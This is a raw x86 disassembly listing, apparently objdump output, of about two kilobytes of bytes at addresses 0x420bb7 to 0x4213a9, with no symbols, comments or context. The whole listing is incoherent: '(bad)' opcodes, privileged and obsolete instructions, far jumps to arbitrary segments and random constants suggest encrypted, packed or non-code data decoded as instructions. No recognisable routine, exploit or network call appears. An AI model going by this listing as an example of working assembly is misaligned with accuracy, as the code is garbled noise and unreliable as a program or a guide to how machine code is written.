  420bb7:	xor    eax,0x85f9707f
  420bbc:	out    0xef,eax
  420bbe:	hlt    
  420bbf:	fwait
  420bc0:	in     al,0xf2
  420bc2:	xlat   BYTE PTR ds:[ebx]
  420bc3:	cdq    
  420bc4:	sbb    al,0x60
  420bc6:	jp     0x420b8c
  420bc8:	ret    
  420bc9:	lock and ebp,edx
  420bcc:	pop    ds
  420bcd:	fld    QWORD PTR [ebp-0x7e1b2ed8]
  420bd3:	xor    eax,0x5a3ddb8a
  420bd8:	stc    
  420bd9:	mov    ah,0xb0
  420bdb:	call   0xea1c7f4
  420be0:	adc    ecx,ecx
  420be2:	or     cl,BYTE PTR [ebx]
  420be4:	mov    al,0xd8
  420be6:	aas    
  420be7:	ss jecxz 0x420ba4
  420bea:	(bad)  
  420bec:	shl    DWORD PTR [esi],1
  420bee:	xchg   BYTE PTR [eax-0x2a1e4c5c],ah
  420bf4:	adc    BYTE PTR [esi+0x78e4c91f],0x36
  420bfb:	sar    bh,cl
  420bfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bfe:	push   ebx
  420bff:	jns    0x420b85
  420c01:	stos   DWORD PTR es:[edi],eax
  420c02:	mov    esp,0x86b5aa5f
  420c07:	dec    ebp
  420c08:	idiv   BYTE PTR [esi]
  420c0a:	loope  0x420c64
  420c0c:	jns    0x420c3b
  420c0e:	xor    DWORD PTR [esp+eiz*2],0xffffffd6
  420c12:	sbb    DWORD PTR [ebx],edx
  420c14:	push   cs
  420c15:	inc    ebp
  420c16:	arpl   WORD PTR [ebp-0x80],si
  420c19:	ds inc esi
  420c1b:	cmp    DWORD PTR ds:0xb672ee79,esp
  420c21:	sbb    DWORD PTR [ebp+eiz*2+0xd664fa4],0xffffffe8
  420c29:	fisttp WORD PTR cs:[edx-0x3054cb49]
  420c30:	push   0x15e2f3af
  420c35:	icebp  
  420c36:	adc    BYTE PTR [ebp-0x2e36b307],bh
  420c3c:	push   ss
  420c3d:	and    al,0x4d
  420c3f:	(bad)  
  420c40:	push   cs
  420c41:	or     ch,BYTE PTR [esi+0x2c]
  420c44:	xchg   ebp,eax
  420c45:	fdiv   QWORD PTR [ecx-0x48]
  420c48:	xor    DWORD PTR [ecx],esp
  420c4a:	mov    ah,0x93
  420c4c:	add    eax,0xcfa92485
  420c51:	jp     0x420c80
  420c53:	inc    edx
  420c54:	outs   dx,DWORD PTR ds:[esi]
  420c55:	ds dec ebp
  420c57:	in     eax,0xc4
  420c59:	aas    
  420c5a:	mov    esp,0x8623e48
  420c5f:	je     0x420ccf
  420c61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c62:	lea    edx,ds:0x5ac4083e
  420c68:	fidivr DWORD PTR [ebx-0x2236c9a1]
  420c6e:	scas   eax,DWORD PTR es:[edi]
  420c6f:	push   cs
  420c70:	mov    BYTE PTR [ebx+0x3bded703],al
  420c76:	jmp    0x3c79:0xc83f5ba7
  420c7d:	xor    eax,esp
  420c7f:	pop    edx
  420c80:	dec    ecx
  420c81:	std    
  420c82:	mov    esp,0x19b32520
  420c87:	aas    
  420c88:	adc    cl,ch
  420c8a:	mov    ds:0x5d4d98d5,al
  420c8f:	pop    ebx
  420c90:	pop    ds
  420c91:	ficomp DWORD PTR [ebx]
  420c93:	enter  0x1f5a,0x9d
  420c97:	cmp    ah,BYTE PTR [eax-0x77a6c8a1]
  420c9d:	xor    ebp,DWORD PTR [edx+0x7736f30f]
  420ca3:	inc    esp
  420ca4:	test   al,0xed
  420ca6:	dec    ebp
  420ca7:	int3   
  420ca8:	retf   
  420ca9:	int    0xb8
  420cab:	add    al,0x9f
  420cad:	nop
  420cae:	push   esp
  420caf:	xor    cl,BYTE PTR [edi+0x5da75456]
  420cb5:	sub    al,0xbe
  420cb7:	mov    esp,0xa79d5bf0
  420cbc:	mov    ah,0x74
  420cbe:	into   
  420cbf:	sbb    DWORD PTR [ebx-0x4d22ebfd],ecx
  420cc5:	popa   
  420cc6:	dec    ecx
  420cc7:	and    bl,BYTE PTR ds:0x7e4b6475
  420ccd:	call   0x7103:0xa47fb1d4
  420cd4:	ret    0xa08a
  420cd7:	add    BYTE PTR [esi-0x20],dh
  420cda:	enter  0x2695,0xa
  420cde:	sbb    bh,cl
  420ce0:	mov    ebx,0xfa45f6b4
  420ce5:	xchg   BYTE PTR [edx-0x28],ah
  420ce8:	ja     0x420cc1
  420cea:	lock xchg ebp,eax
  420cec:	sub    BYTE PTR [edx+0x8],bh
  420cef:	sub    BYTE PTR [edx+eiz*2-0x2b9a63a7],0x1e
  420cf7:	xchg   edi,eax
  420cf8:	call   0x78c:0x98c5ee8a
  420cff:	ds pop ss
  420d01:	idiv   DWORD PTR [edx+0x519698f7]
  420d07:	lea    ecx,[eax]
  420d09:	icebp  
  420d0a:	mov    BYTE PTR [edi*2+0x1b13d4d0],ch
  420d11:	xchg   esi,eax
  420d12:	push   es
  420d13:	pop    eax
  420d14:	les    eax,FWORD PTR [edx+0x778ca055]
  420d1a:	(bad)  
  420d1b:	hlt    
  420d1c:	(bad)  
  420d1d:	not    BYTE PTR [edi+0x67]
  420d20:	sub    eax,0x967a3b9e
  420d25:	mov    edx,0xa116a247
  420d2a:	pop    edi
  420d2b:	mov    al,ds:0xdac352f0
  420d30:	adc    eax,0x42e93580
  420d35:	dec    eax
  420d36:	lods   eax,DWORD PTR ds:[esi]
  420d37:	push   ecx
  420d38:	xor    al,0xb7
  420d3a:	sahf   
  420d3b:	test   eax,0xa7cbf362
  420d40:	xor    al,0x1d
  420d42:	cld    
  420d43:	xchg   esp,eax
  420d44:	push   esi
  420d45:	(bad)  
  420d46:	sub    ebp,DWORD PTR [edx+0x8ef7d97]
  420d4c:	add    al,0x69
  420d4e:	push   ebx
  420d4f:	pop    ebp
  420d50:	and    ebx,esp
  420d52:	aam    0x6b
  420d54:	mov    ax,0x6a9d
  420d58:	enter  0xe1cc,0xfb
  420d5c:	scas   al,BYTE PTR es:[edi]
  420d5d:	repz sub dh,dh
  420d60:	adc    BYTE PTR [ecx],dh
  420d62:	push   esp
  420d63:	jbe    0x420d72
  420d65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d66:	out    dx,eax
  420d67:	sahf   
  420d68:	or     ecx,DWORD PTR [edi]
  420d6a:	inc    eax
  420d6b:	push   es
  420d6c:	mov    esp,0x93558952
  420d71:	pop    eax
  420d72:	faddp  st(7),st
  420d74:	loope  0x420dca
  420d76:	fucomi st,st(5)
  420d78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d79:	jae    0x420d6b
  420d7b:	mov    ebx,0xf9de348d
  420d80:	or     ah,BYTE PTR [edx-0x1246bb68]
  420d86:	mov    al,0x58
  420d88:	mov    eax,ds:0xbb8c88ee
  420d8d:	or     edi,DWORD PTR [edx+0x25]
  420d90:	ret    
  420d91:	je     0x420e07
  420d93:	pop    esi
  420d94:	fwait
  420d95:	pop    edx
  420d96:	jnp    0x420d32
  420d98:	pop    edi
  420d99:	sbb    esi,DWORD PTR [esi-0x55264054]
  420d9f:	gs test eax,0xee91d759
  420da5:	cmp    DWORD PTR [edx],ebp
  420da7:	mov    bh,0xf8
  420da9:	out    dx,al
  420daa:	mov    esp,0x6df9ffba
  420daf:	loopne 0x420d3f
  420db1:	jp     0x420dd6
  420db3:	stos   DWORD PTR es:[edi],eax
  420db4:	inc    ecx
  420db5:	inc    esi
  420db6:	mov    dl,0xfe
  420db8:	jne    0x420d89
  420dba:	mov    al,0xe5
  420dbc:	jae    0x420d62
  420dbe:	dec    eax
  420dc0:	or     BYTE PTR [ebp-0x53],cl
  420dc3:	or     DWORD PTR [ebp-0x9],edx
  420dc6:	frstor [eax+ebx*4]
  420dc9:	mov    bl,0xad
  420dcb:	inc    esp
  420dcc:	(bad)  
  420dcd:	iret   
  420dce:	xor    eax,0x2850fe5d
  420dd3:	jg     0x420e19
  420dd5:	fucomip st,st(1)
  420dd7:	or     edi,ecx
  420dd9:	push   edx
  420dda:	stos   DWORD PTR es:[edi],eax
  420ddb:	add    DWORD PTR [ebp-0x55554121],edi
  420de1:	cdq    
  420de2:	mov    ah,0x6e
  420de4:	mov    cs,WORD PTR [edx+0xa851cd7]
  420dea:	or     ecx,DWORD PTR [esi+0x69]
  420ded:	gs mov ecx,0x7fc64d90
  420df3:	leave  
  420df4:	sub    eax,0x20cf4b99
  420df9:	xor    eax,0x8f08f232
  420dfe:	dec    eax
  420dff:	xor    al,0xf9
  420e01:	adc    DWORD PTR [eax+edx*8+0x46ac4578],ebp
  420e08:	pop    ecx
  420e09:	jae    0x420de8
  420e0b:	jbe    0x420df2
  420e0d:	imul   BYTE PTR [eax]
  420e0f:	sti    
  420e10:	fwait
  420e11:	push   edx
  420e12:	lea    edi,[edx]
  420e14:	or     BYTE PTR [eax-0x2b018d72],bh
  420e1a:	jmp    0x8c6965e8
  420e1f:	cmp    BYTE PTR [ebx-0x1d315002],bl
  420e25:	js     0x420dd3
  420e27:	inc    eax
  420e28:	sub    dl,dl
  420e2a:	aad    0x50
  420e2c:	les    ecx,FWORD PTR [esi+esi*8]
  420e2f:	xor    esp,DWORD PTR [ebx]
  420e31:	add    al,0x83
  420e33:	(bad)  
  420e34:	int3   
  420e35:	pop    ebx
  420e36:	pop    ss
  420e37:	ss aam 0x5
  420e3a:	pushf  
  420e3b:	dec    eax
  420e3c:	cmp    DWORD PTR [esi-0x23],esi
  420e3f:	mov    ah,0x5a
  420e41:	ds xchg ebp,eax
  420e43:	fisub  DWORD PTR [esi-0x46]
  420e46:	xchg   edx,eax
  420e47:	mov    BYTE PTR [ebp-0x6a],cl
  420e4a:	xchg   esi,eax
  420e4b:	ret    
  420e4c:	or     al,dl
  420e4e:	or     al,BYTE PTR [esi+eiz*8-0xe]
  420e52:	mov    ds:0x3136457f,al
  420e57:	nop
  420e58:	push   0xd9f77906
  420e5d:	sbb    ah,BYTE PTR [edi+0x3e1828be]
  420e63:	dec    edi
  420e64:	xor    DWORD PTR [eax+0x6d],edi
  420e67:	add    ecx,eax
  420e69:	fbstp  TBYTE PTR [ebx]
  420e6b:	popf   
  420e6c:	and    edi,eax
  420e6e:	xor    BYTE PTR [edi+0x6e],bh
  420e71:	ss mov dh,0x88
  420e74:	das    
  420e75:	and    bl,BYTE PTR [ebp+0x58]
  420e78:	jno    0x420e6f
  420e7a:	mov    bh,0x2a
  420e7c:	mov    bl,0xb3
  420e7e:	cmp    dh,BYTE PTR [edx+ecx*4+0x6]
  420e82:	adc    DWORD PTR [esi-0x356e3294],ebx
  420e88:	pusha  
  420e89:	call   0xa6c7:0x18e11bc4
  420e90:	aaa    
  420e91:	and    al,0x19
  420e93:	mov    ebp,DWORD PTR ss:[esi]
  420e96:	push   0xffffffcb
  420e98:	int    0x4f
  420e9a:	mov    ebp,edx
  420e9c:	loope  0x420e8f
  420e9e:	into   
  420e9f:	scas   eax,DWORD PTR es:[edi]
  420ea0:	ins    DWORD PTR es:[edi],dx
  420ea1:	in     al,dx
  420ea2:	(bad)  
  420ea3:	pop    esi
  420ea4:	ret    0xfdd8
  420ea7:	inc    esp
  420ea8:	repz ds xor al,0x64
  420eac:	and    BYTE PTR [edi+0x68],0x5a
  420eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420eb1:	xor    BYTE PTR [ebp+0x3cbb480b],al
  420eb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420eb8:	je     0x420f05
  420eba:	mov    ebp,0xa05d4f3f
  420ebf:	aam    0x42
  420ec1:	and    BYTE PTR [edx],0xfe
  420ec4:	jmp    0xe2ee:0x6d14c538
  420ecb:	lods   al,BYTE PTR ds:[esi]
  420ecc:	adc    eax,0x7cac89c6
  420ed1:	dec    ebx
  420ed2:	arpl   WORD PTR [ebx],di
  420ed4:	stc    
  420ed5:	fnsetpm(287 only) 
  420ed7:	mov    cl,BYTE PTR [esi+0x209b52f9]
  420edd:	jp     0x420ea3
  420edf:	mov    ds:0xae2557cf,eax
  420ee4:	in     al,dx
  420ee5:	jb     0x420f1d
  420ee7:	jae    0x420ea6
  420ee9:	add    eax,0xac1ad9
  420eee:	and    DWORD PTR [ebx+edx*2],eax
  420ef1:	xchg   ecx,eax
  420ef2:	cmp    al,BYTE PTR [esi+0x5f20d051]
  420ef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ef9:	push   ss
  420efa:	adc    DWORD PTR [eax+0x26],ebx
  420efd:	pop    ss
  420efe:	test   BYTE PTR [edx-0x5a],bl
  420f01:	jae    0x420e88
  420f03:	daa    
  420f04:	sub    DWORD PTR [eax],0xffffff9c
  420f07:	mov    al,0x98
  420f09:	pushf  
  420f0a:	sbb    al,0xdd
  420f0c:	dec    ebp
  420f0d:	xor    eax,0x12d85476
  420f12:	(bad)  
  420f13:	out    0x95,eax
  420f15:	jle    0x420f5f
  420f17:	shl    BYTE PTR [edi*1-0x2e3ba437],1
  420f1e:	sahf   
  420f1f:	mov    bl,0xa5
  420f21:	mov    ebp,0xed16c492
  420f26:	hlt    
  420f27:	fild   QWORD PTR [edx+0x3d]
  420f2a:	xchg   ecx,eax
  420f2b:	scas   al,BYTE PTR es:[edi]
  420f2c:	adc    dh,BYTE PTR [edx+0x4776fd87]
  420f32:	aaa    
  420f33:	call   0xdb4fec7e
  420f38:	xor    bl,bl
  420f3a:	stos   DWORD PTR es:[edi],eax
  420f3b:	(bad)  
  420f3c:	jnp    0x420f6b
  420f3e:	aaa    
  420f3f:	int3   
  420f40:	loop   0x420ec3
  420f42:	push   cs
  420f43:	jl     0x420efc
  420f45:	xchg   BYTE PTR [edx+0x57],dl
  420f48:	sub    al,0x77
  420f4a:	fwait
  420f4b:	test   DWORD PTR [eax+0xc],edi
  420f4e:	stos   BYTE PTR es:[edi],al
  420f4f:	mov    dl,0x1d
  420f51:	imul   esi,DWORD PTR [edx-0x67],0xe2dd3e1f
  420f58:	dec    esp
  420f59:	add    ecx,DWORD PTR [ebp-0x72]
  420f5c:	cmp    dh,BYTE PTR [edi]
  420f5e:	add    ebx,ebp
  420f60:	sub    BYTE PTR [ecx],al
  420f62:	mov    esi,DWORD PTR [esi-0x27679dd6]
  420f68:	(bad)  
  420f69:	fidiv  WORD PTR [ebx+edi*1-0x201da34e]
  420f70:	cmp    eax,0xe28595e4
  420f75:	lods   eax,DWORD PTR ds:[esi]
  420f76:	mov    esp,0x2b8de89c
  420f7b:	jl     0x420f12
  420f7d:	jo     0x420fd4
  420f7f:	dec    ebx
  420f80:	add    bh,BYTE PTR [ecx-0x80]
  420f83:	add    al,BYTE PTR [eax]
  420f85:	pop    ebx
  420f86:	out    0xa6,al
  420f88:	hlt    
  420f89:	ins    DWORD PTR es:[edi],dx
  420f8a:	jp     0x420ffe
  420f8c:	sbb    cl,BYTE PTR [ebp+0x5e]
  420f8f:	dec    esp
  420f90:	and    BYTE PTR [esi],al
  420f92:	xchg   edx,eax
  420f93:	enter  0x18cb,0xbb
  420f97:	and    DWORD PTR [edx-0x55],ebp
  420f9a:	sar    dl,cl
  420f9c:	out    0x50,eax
  420f9e:	sub    DWORD PTR [ebp+0x7a3ebf3f],ebx
  420fa4:	scas   al,BYTE PTR es:[edi]
  420fa5:	dec    edi
  420fa6:	pop    ebx
  420fa7:	cmp    eax,0x1b9e82d4
  420fac:	push   0xed6d800d
  420fb1:	hlt    
  420fb2:	and    DWORD PTR [eax+0x32],esi
  420fb5:	add    ebx,DWORD PTR [edx+0x49]
  420fb8:	ss into 
  420fba:	fild   DWORD PTR [ebx]
  420fbd:	pop    edx
  420fbe:	push   ds
  420fbf:	stos   DWORD PTR es:[edi],eax
  420fc0:	mov    ecx,0x625036e7
  420fc5:	push   cs
  420fc6:	retf   0x829d
  420fc9:	fldenv [ebp+0x3075ec60]
  420fcf:	scas   al,BYTE PTR es:[edi]
  420fd0:	xchg   DWORD PTR [esi],eax
  420fd2:	jnp    0x420f9c
  420fd4:	cmc    
  420fd5:	div    DWORD PTR [ebp-0x6c]
  420fd8:	sahf   
  420fd9:	pop    ebx
  420fda:	push   ebp
  420fdb:	into   
  420fdc:	jmp    0x420f5e
  420fde:	(bad)  
  420fe0:	stc    
  420fe1:	sub    al,BYTE PTR [ecx]
  420fe3:	add    al,BYTE PTR [edi+esi*8-0x6858bc36]
  420fea:	sub    dh,0xe3
  420fed:	mov    edx,0x2d1287df
  420ff2:	out    0x6a,al
  420ff4:	leave  
  420ff5:	mov    ebp,0x4177c8bd
  420ffa:	mov    ah,ch
  420ffc:	das    
  420ffd:	test   DWORD PTR [eax-0x7bca27f],0x69639eb4
  421007:	add    DWORD PTR [eax],edi
  421009:	call   0x187a8926
  42100e:	aaa    
  42100f:	mov    dh,0xa5
  421011:	add    al,0x5d
  421013:	fstp   QWORD PTR [edi+0x36]
  421016:	dec    ebp
  421017:	mov    al,BYTE PTR [edx+0x5f]
  42101a:	mov    dl,0xda
  42101c:	xor    BYTE PTR [edx+0x42a706c2],0x54
  421023:	fsubr  QWORD PTR [ebx-0xcf3ddd0]
  421029:	icebp  
  42102a:	push   edi
  42102b:	ss cld 
  42102d:	loope  0x42108f
  42102f:	std    
  421030:	ficomp WORD PTR [ebx+ebp*1-0x7fa6db02]
  421037:	jge    0x421022
  421039:	cmp    eax,0x65055144
  42103e:	adc    al,0x71
  421040:	sbb    al,0x4b
  421042:	sub    esi,DWORD PTR [ebx]
  421044:	pop    ecx
  421045:	loope  0x421035
  421047:	lahf   
  421048:	(bad)  
  421049:	cld    
  42104a:	mov    WORD PTR ds:0x115a9616,fs
  421050:	pmullw mm7,QWORD PTR [bx+di-0x3]
  421055:	bound  ebp,QWORD PTR [eax+0x6d]
  421058:	lahf   
  421059:	mov    ecx,0xf26cbfef
  42105e:	push   0x95536fc6
  421063:	or     al,dh
  421065:	sub    BYTE PTR [edi+0x3df56f17],0xa6
  42106c:	mov    WORD PTR [eax+0x22],cs
  42106f:	mov    ds:0x29669c47,al
  421074:	in     al,0xac
  421076:	aad    0xe6
  421078:	mov    ecx,ebx
  42107a:	jle    0x42100c
  42107c:	loope  0x4210f5
  42107e:	sub    eax,DWORD PTR [edi-0x12b7f4bf]
  421084:	call   0x9261:0x8c5e88a1
  42108b:	cmc    
  42108c:	push   eax
  42108d:	mov    es,WORD PTR ds:0x15a1ba3f
  421093:	mov    al,0xb6
  421095:	test   eax,0x65175eca
  42109a:	push   ss
  42109b:	and    ecx,DWORD PTR ds:0x587ea435
  4210a1:	ss retf 0xa5eb
  4210a5:	mov    ds:0x81368892,al
  4210aa:	push   cs
  4210ab:	fadd   st(3),st
  4210ad:	dec    esp
  4210ae:	or     eax,0x1c886da9
  4210b3:	addr16 mov al,0xf4
  4210b6:	xchg   edx,eax
  4210b7:	and    esp,DWORD PTR [esi]
  4210b9:	psubb  mm3,QWORD PTR [ecx-0x1a291877]
  4210c0:	pop    esp
  4210c1:	in     eax,0x96
  4210c3:	loope  0x42113b
  4210c5:	sub    DWORD PTR [ebx-0x1103227d],0x5bec342d
  4210cf:	adc    DWORD PTR [ebx-0x53],0xffffff8d
  4210d3:	push   esi
  4210d4:	jbe    0x4210f2
  4210d6:	inc    edi
  4210d7:	cmp    eax,0x1cfa2c87
  4210dc:	jae    0x42109c
  4210de:	push   0x5a45b428
  4210e3:	pop    edx
  4210e5:	dec    esi
  4210e6:	xchg   edi,eax
  4210e7:	add    al,0xbc
  4210e9:	mov    dl,0x28
  4210eb:	retf   
  4210ec:	dec    esi
  4210ed:	xchg   BYTE PTR [ebx-0x42e9f1ac],bl
  4210f3:	retf   0x26a7
  4210f6:	mov    esi,0x9e7b12fc
  4210fb:	int    0x3
  4210fd:	es sbb ah,cl
  421100:	push   0x7c
  421102:	sub    DWORD PTR [ecx+0x5b32ced6],ecx
  421108:	mov    ds:0x941df86c,eax
  42110d:	xchg   edi,eax
  42110e:	xchg   ecx,eax
  42110f:	mov    WORD PTR [ecx+0x259351cb],ss
  421115:	or     al,0xb1
  421117:	jge    0x4210cd
  421119:	mov    cl,0x18
  42111b:	push   esi
  42111c:	and    al,0x63
  42111e:	call   0x50ab:0x906c9ea
  421125:	sub    BYTE PTR [esi+0x63],0xcf
  421129:	cld    
  42112a:	push   esi
  42112b:	fcmovne st,st(5)
  42112d:	xchg   edi,eax
  42112e:	jmp    0x4210c5
  421130:	imul   ecx
  421132:	jle    0x42112f
  421134:	sbb    al,0xf7
  421136:	adc    esp,0xbf9df709
  42113c:	lods   eax,DWORD PTR ds:[esi]
  42113d:	sahf   
  42113e:	xchg   edi,eax
  42113f:	sub    bl,dl
  421141:	mov    al,ds:0x9aeabe14
  421146:	xchg   esi,eax
  421147:	scas   al,BYTE PTR es:[edi]
  421148:	and    DWORD PTR [edx-0x1d2ef4c6],ebx
  42114e:	scas   al,BYTE PTR es:[edi]
  42114f:	stc    
  421150:	sahf   
  421151:	cmc    
  421152:	icebp  
  421153:	jnp    0x421107
  421155:	push   esp
  421156:	out    dx,al
  421157:	mov    edx,0x737d79c2
  42115c:	dec    ebp
  42115d:	jecxz  0x421189
  42115f:	jge    0x4211c2
  421161:	ins    BYTE PTR es:[edi],dx
  421162:	test   eax,0xb5245bbf
  421167:	or     eax,0xa3e6cd92
  42116c:	retf   0x79ca
  42116f:	test   eax,0x398206fa
  421174:	outs   dx,BYTE PTR ds:[esi]
  421175:	cwde   
  421176:	fsub   st(6),st
  421178:	div    DWORD PTR [eax+0x43]
  42117b:	int3   
  42117c:	xlat   BYTE PTR ds:[ebx]
  42117d:	icebp  
  42117e:	mov    esp,0xd5b5d87
  421183:	scas   eax,DWORD PTR es:[edi]
  421184:	in     eax,0xcb
  421186:	das    
  421187:	fisubr DWORD PTR [ebp+0x4206fb12]
  42118d:	test   eax,0xf49c867b
  421192:	cmp    esi,DWORD PTR [edx]
  421194:	outs   dx,BYTE PTR ds:[esi]
  421195:	loop   0x421131
  421197:	rcl    BYTE PTR [edi],cl
  421199:	dec    esi
  42119a:	imul   esp,eax,0xd3f9afdf
  4211a0:	fadd   st(3),st
  4211a2:	(bad)  
  4211a3:	mov    eax,0x4defe84f
  4211a8:	or     dh,dh
  4211aa:	in     eax,dx
  4211ab:	jno    0x421205
  4211ad:	adc    cl,al
  4211af:	xchg   BYTE PTR [ecx+0x43],cl
  4211b2:	sbb    esi,DWORD PTR [esi]
  4211b4:	test   eax,0xaeabce1
  4211b9:	sbb    BYTE PTR [edx-0x5a],dl
  4211bc:	out    dx,eax
  4211bd:	push   edi
  4211be:	push   esp
  4211bf:	je     0x4211de
  4211c1:	bnd jge 0x421214
  4211c4:	repz lea edx,[edx-0x32b97a75]
  4211cb:	inc    edx
  4211cc:	out    dx,al
  4211cd:	fdivp  st(5),st
  4211cf:	mov    edi,0x187f166a
  4211d4:	nop
  4211d5:	inc    edi
  4211d6:	data16 add al,bl
  4211d9:	icebp  
  4211da:	xchg   bh,al
  4211dc:	jae    0x421239
  4211de:	stc    
  4211df:	cmp    ebx,DWORD PTR ds:0x58f88165
  4211e5:	nop
  4211e6:	jecxz  0x421238
  4211e8:	es fsubr st,st(4)
  4211eb:	(bad)  
  4211ec:	push   ebp
  4211ed:	jg     0x421176
  4211ef:	mov    ds,WORD PTR [ebp+0x71]
  4211f2:	dec    ecx
  4211f3:	xlat   BYTE PTR ds:[ebx]
  4211f4:	sbb    al,0xd2
  4211f6:	repz enter 0x1020,0xc6
  4211fb:	mov    ch,0xf0
  4211fd:	add    BYTE PTR [ebp+0x3],0x37
  421201:	adc    esp,ebp
  421203:	pop    es
  421204:	cld    
  421205:	aad    0xf4
  421207:	je     0x42123b
  421209:	in     al,dx
  42120a:	add    BYTE PTR [esi],cl
  42120c:	push   esi
  42120d:	loop   0x4211d3
  42120f:	popf   
  421210:	and    BYTE PTR [ebx-0x6a68690c],dl
  421216:	dec    eax
  421217:	lea    esp,ds:0xa33d5f07
  42121d:	mov    eax,0x4aeda182
  421222:	pushf  
  421223:	pusha  
  421224:	stc    
  421225:	lods   al,BYTE PTR ds:[esi]
  421226:	push   0xffffff89
  421228:	sub    esp,DWORD PTR [ebx]
  42122a:	xchg   edi,eax
  42122b:	mov    al,ds:0x309697cd
  421230:	idiv   DWORD PTR [edx-0x78e3ffac]
  421236:	add    BYTE PTR [ebx+edi*8-0x2c],dh
  42123a:	add    DWORD PTR [ebx],ebp
  42123c:	call   0x790c:0x5229de8a
  421243:	je     0x421290
  421245:	mov    eax,0xe297634a
  42124a:	ret    
  42124b:	mov    DWORD PTR [edx],ecx
  42124d:	and    BYTE PTR [ecx+0x66],ah
  421250:	cmp    DWORD PTR [ecx+0x68ebec2d],ebp
  421256:	fnstsw WORD PTR [esp+ebx*8]
  421259:	ins    BYTE PTR es:[edi],dx
  42125a:	xor    bl,bl
  42125c:	jmp    0x4212a6
  42125e:	jmp    0xce96:0xfc0d1317
  421265:	xchg   BYTE PTR [eax*8-0x47ba958f],ch
  42126c:	mov    bh,0xfe
  42126e:	test   BYTE PTR [ebx+0x1281b7b3],cl
  421274:	cmp    dh,BYTE PTR [ecx-0x4631d91b]
  42127a:	dec    edx
  42127b:	add    dh,dh
  42127d:	mov    bh,0x30
  42127f:	popa   
  421280:	retf   
  421281:	xchg   esi,eax
  421282:	das    
  421283:	push   ebp
  421284:	loop   0x4212f6
  421286:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421287:	(bad)  
  421288:	scas   eax,DWORD PTR es:[edi]
  421289:	cmp    bh,dh
  42128b:	dec    esi
  42128c:	xor    al,0xcb
  42128e:	daa    
  42128f:	push   edx
  421290:	inc    esp
  421291:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421292:	ds aad 0xae
  421295:	nop
  421296:	shr    BYTE PTR [ebx],1
  421298:	lock call 0x5e0006bb
  42129e:	fist   WORD PTR [eax]
  4212a0:	loope  0x42124a
  4212a2:	repnz mov eax,DWORD PTR [esi+0x66]
  4212a6:	mov    WORD PTR [eax-0x5dceed38],gs
  4212ac:	adc    eax,0x9aa7f259
  4212b1:	in     al,0x4c
  4212b3:	dec    ebp
  4212b4:	rcl    BYTE PTR [edx+0x5b5d214d],0x6
  4212bb:	sbb    al,0x6e
  4212bd:	and    BYTE PTR [esi-0x4f718507],al
  4212c3:	push   ds
  4212c4:	out    dx,al
  4212c5:	cwde   
  4212c6:	xchg   edi,eax
  4212c7:	or     dl,dh
  4212c9:	clc    
  4212ca:	inc    ebp
  4212cb:	test   dl,0xed
  4212ce:	and    eax,0xddfc5bbe
  4212d3:	and    eax,0xb4a0a2d7
  4212d8:	call   0x5e04bfff
  4212dd:	das    
  4212de:	dec    edi
  4212df:	push   ebx
  4212e0:	daa    
  4212e1:	shr    BYTE PTR [edi-0x79],1
  4212e4:	test   al,0x79
  4212e6:	retf   0x2550
  4212e9:	mov    ebx,0x95f232
  4212ee:	pusha  
  4212ef:	mov    edi,0xacbc5ce1
  4212f4:	cmp    DWORD PTR [edi-0x63],edx
  4212f7:	and    esp,edi
  4212f9:	int    0xf8
  4212fb:	je     0x4212f6
  4212fd:	add    al,0x2b
  4212ff:	jbe    0x421281
  421301:	cld    
  421302:	fild   WORD PTR [ebp+0x17d34778]
  421308:	rcl    dl,1
  42130a:	aam    0xe3
  42130c:	addr16 push edx
  42130e:	retf   
  42130f:	or     DWORD PTR [edx],ecx
  421311:	ja     0x4212a5
  421313:	pop    ecx
  421314:	pop    edx
  421315:	repz and BYTE PTR [ebx-0x171cb0ee],0x2d
  42131d:	xchg   esi,eax
  42131e:	cmp    bl,BYTE PTR [ecx+eax*2-0x3e130f9e]
  421325:	sub    BYTE PTR [eax+edx*2],dl
  421328:	mov    bh,0x8
  42132a:	aad    0xf5
  42132c:	xchg   ch,dl
  42132e:	adc    BYTE PTR [ebx],ch
  421330:	push   esp
  421331:	jno    0x4212da
  421333:	ret    0xa738
  421336:	xor    DWORD PTR [ecx-0x6],esp
  421339:	sar    DWORD PTR [ecx],0xcc
  42133c:	xchg   edx,eax
  42133d:	xchg   al,ch
  42133f:	and    eax,ebx
  421341:	xor    al,bh
  421343:	mov    ch,0x3a
  421345:	int3   
  421346:	mov    ah,0x38
  421348:	pop    sp
  42134a:	adc    eax,0xd029b980
  42134f:	(bad)  
  421350:	std    
  421351:	out    0x8,eax
  421353:	xchg   ebp,eax
  421354:	dec    esi
  421355:	dec    esp
  421356:	pshufw mm3,QWORD PTR [ebp-0x9],0xdc
  42135b:	leave  
  42135c:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  42135e:	inc    edx
  42135f:	mov    al,0xf7
  421361:	adc    eax,0xa1c5f6b4
  421366:	outs   dx,BYTE PTR ds:[esi]
  421367:	js     0x421383
  421369:	mov    ds:0x544d6a60,al
  42136e:	loop   0x421308
  421370:	lods   al,BYTE PTR ds:[esi]
  421371:	and    al,0xa1
  421373:	or     dl,BYTE PTR [eax-0x3e]
  421376:	or     al,0x1a
  421378:	xchg   ebp,eax
  421379:	jnp    0x42135d
  42137b:	jnp    0x421379
  42137d:	jns    0x421384
  42137f:	add    bl,BYTE PTR ds:0x2ba4f28a
  421385:	pop    ebp
  421386:	sbb    edx,DWORD PTR [ecx]
  421388:	dec    esi
  421389:	mov    ah,0x3
  42138b:	cdq    
  42138c:	pop    esp
  42138d:	sbb    cl,BYTE PTR [ecx-0x2c]
  421390:	rcr    BYTE PTR [ecx-0x51],1
  421393:	xor    al,BYTE PTR [edi]
  421395:	xor    al,0x80
  421397:	jno    0x4213ab
  421399:	pop    ds
  42139a:	and    BYTE PTR [ebp+0x1a0a883f],0xba
  4213a1:	add    al,0xc1
  4213a3:	pop    ss
  4213a4:	dec    edx
  4213a5:	out    0xbf,al
  4213a7:	aam    0xae
  4213a9:	std    
